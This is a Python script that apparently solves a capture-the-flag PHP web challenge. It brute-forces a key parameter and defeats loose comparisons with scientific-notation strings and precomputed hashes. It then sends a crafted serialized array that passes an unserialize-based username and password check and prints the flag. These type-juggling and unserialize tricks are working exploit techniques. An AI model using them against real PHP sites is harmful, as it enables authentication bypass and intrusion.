import requests
import hashlib 
import re





url = "https://sec-army.ml/fatherphp/fatherphp.php?key1="

s= requests.session()
d = "1"

for d in range(-1000,100):
    #print d

    r= s.get(url + str(d))
    if "secarmy" in r.content:
        print r.content
        print d
        url2 = url + str(d) 
        # 1e1-2  == 8 
        r1 = s.get(url2 + "&" + "key2=1e1-2")
        print r1.content
        # rq md5 = c6d8c86cf807f3f3b38850342d1531b3
        md5value = "rq"
        h = hashlib.md5(md5value.encode())
        fd = h.hexdigest()
       
        url3 = str(url2 + "&" + "rq=rq" + "&" + "key2=1e1-2" + "&"  + 'fp='+ fd)
        #print url3

        r3 = s.get(url3)
        #print r3.content


#root@Rootx:~/ctf/ringctf# php -a
#Interactive mode enabled
#php > $n = hash('ripemd160',"'np'");
#php > echo $n;
#6b8e49d76469a9c097976a8940983f8992c8fabc
#php > 



        ns = "6b8e49d76469a9c097976a8940983f8992c8fabc"
        url4 = str(url3 + "&" + 'np=' + ns)
        r4 = s.get(url4)
        print r4.content
        print url4    
        
#$data = unserialize($hell); a:2 is two array value 
#if ($data['username'] == $adminName && $data['password'] == $adminPassword) { | s:8 "username" and s:8 "password"
#echo $flag5 . "<br>";
#} else {
# die("useless");
#}



        unserialize = "a:2:{s:8:" + '"' + "username" + '"' + ";d:0;s:8:" + '"' + "password" + '"' + ";d:0;}"
        url5 = str(url4 + "&" + "key3=" + unserialize)
        r5 = s.get(url5)
        ft=(r5.content).split('\n')
        f=ft[3].split('<br>')
        print f[1]+f[3]+f[4]+f[5] 
        break

        


    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
